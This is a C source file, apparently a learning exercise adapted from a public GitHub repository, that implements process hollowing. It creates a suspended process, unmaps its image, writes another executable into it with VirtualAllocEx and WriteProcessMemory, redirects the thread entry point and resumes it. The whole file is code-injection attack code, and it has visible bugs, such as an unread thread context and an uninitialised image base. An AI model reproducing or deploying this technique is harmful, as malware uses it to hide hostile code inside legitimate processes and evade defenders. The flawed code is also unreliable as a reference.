// COPY https://github.com/m0n0ph1/Process-Hollowing
#include<stdio.h>

#include".\\..\\..\\PE_HANDLE_LIB\\pe.h"
#include".\\..\\..\\PE_HANDLE_LIB\\_global.h"


typedef NTSTATUS (WINAPI* _NtUnmapViewOfSection)(
	HANDLE ProcessHandle,
	PVOID BaseAddress
	);

/*
1.以挂起的方式创建一个进程
2.卸载该进程的内存映射，即掏空该进程虚拟内存空间中的内容
3.获取该进程的CONTEXT上下文结构
4.将要注入的程序读入到内存中
5.在傀儡进程中申请足够的内存空间
6.手动将要注入的程序写入傀儡进程中所申请的内存空间
6.设置CONTEXT上下文的Eax为程序入口点，Ebx+8为程序基址
7.恢复线程
*/

void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFileName)
{
	DEBUG_INFO("[+]Creating Process\r\n");

	BOOL bResult = FALSE;
	STARTUPINFOA StartupInfo = { 0 };
	PROCESS_INFORMATION ProcessInformation = { 0 };

	CONTEXT context = { 0 };
	ULONG_PTR ulImageBase = 0;
	DWORD dwFileSize = 0;
	DWORD dwSizeOfImage = 0;


	//memory of source file 
	LPVOID lpSourceFile = NULL;
	LPVOID lpExpendFile = NULL;

	StartupInfo.cb = sizeof(StartupInfo);
	do
	{
		//创建挂起的进程
		if ( !CreateProcessA(
			0,
			pDestCmdLine,
			0,
			0,
			FALSE,
			CREATE_SUSPENDED,
			0,
			0,
			&StartupInfo,
			&ProcessInformation
		) ) {
			DEBUG_ERROR("[-] 创建失败");
			break;
		}


		DEBUG_INFO("[+] ZwNtUnMapViewOfSection");
		FARPROC pfnZwUnmapViewOfSecrtion = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
		if ( !pfnZwUnmapViewOfSecrtion ) {
			DEBUG_ERROR("[-] GetAddress NtUnmapViewOfSection Error");
		}
		_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)pfnZwUnmapViewOfSecrtion;

		//unmap image
		NtUnmapViewOfSection(ProcessInformation.hProcess, (PVOID)ulImageBase);

		//ReadFile
		lpSourceFile = MyReadFile(pSourceFileName, &dwFileSize, 0);
		if ( lpSourceFile == NULL ) {
			DEBUG_ERROR("[-] ReadFile Error");
			break;
		}
		//申请足够的空间
		dwSizeOfImage = GetSizeOfImage((PIMAGE_DOS_HEADER)lpSourceFile);
		lpExpendFile = VirtualAllocEx(ProcessInformation.hProcess, GetImageBase((PIMAGE_DOS_HEADER)lpSourceFile), dwSizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		//PE修复
		DEBUG_INFO("[+] Start Copy PE");
		AcrossCopyHeader(ProcessInformation.hProcess, lpExpendFile, (PIMAGE_DOS_HEADER)lpSourceFile);
		AcrossCopyAllSection (ProcessInformation.hProcess, lpExpendFile, (PIMAGE_DOS_HEADER)lpSourceFile, dwSizeOfImage);

		//DEBUG_INFO("[+]Start Fix IAT and RELOC");
		//ShellCodeRepairImportTable((PIMAGE_DOS_HEADER)lpExpendFile, GetProcAddress, LoadLibraryA);
		//ShellCodeFixReloc((PIMAGE_DOS_HEADER)lpExpendFile, (PIMAGE_DOS_HEADER)pSourceFileName);


		DEBUG_INFO("[+]Setting EntryPoint");
		CONTEXT newcontext = { 0 };
		newcontext.ContextFlags = CONTEXT_INTEGER;
		DWORD dwImageBase = (DWORD)lpExpendFile;

#ifdef _WIN64
		context.Rax = GetAddressOfEntryPoint(ProcessInformation.hProcess,(PIMAGE_DOS_HEADER)lpExpendFile);
#else
		context.Eax = GetAddressOfEntryPoint(ProcessInformation.hProcess,(PIMAGE_DOS_HEADER)lpExpendFile);
		WriteProcessMemory(ProcessInformation.hProcess, (LPVOID)( context.Ebx + 0x8 ), &dwImageBase, sizeof(DWORD), 0);
#endif

		DEBUG_INFO("[+]Setting Context");
		if ( !SetThreadContext(ProcessInformation.hThread, &newcontext) ) {
			DEBUG_ERROR("[-] SetThreadContext Error");
			break;
		}

		DEBUG_INFO("[+]Resume Context");
		if ( !ResumeThread(ProcessInformation.hThread) ) {
			DEBUG_ERROR("[-] SetThreadContext Error");
			break;
		}


	} while ( 0 );


	//avoid leak process handle
	//if ( ProcessInformation.hProcess != 0 || ProcessInformation.hThread != 0 )
	//{
	//	CloseHandle(ProcessInformation.hProcess);
	//	CloseHandle(ProcessInformation.hThread);
	//}
}

int main(int argc, char* argv[])
{

	CreateHollowedProcess("pause.exe", "HelloWorld.exe");
	system("pause");
	return	0;
}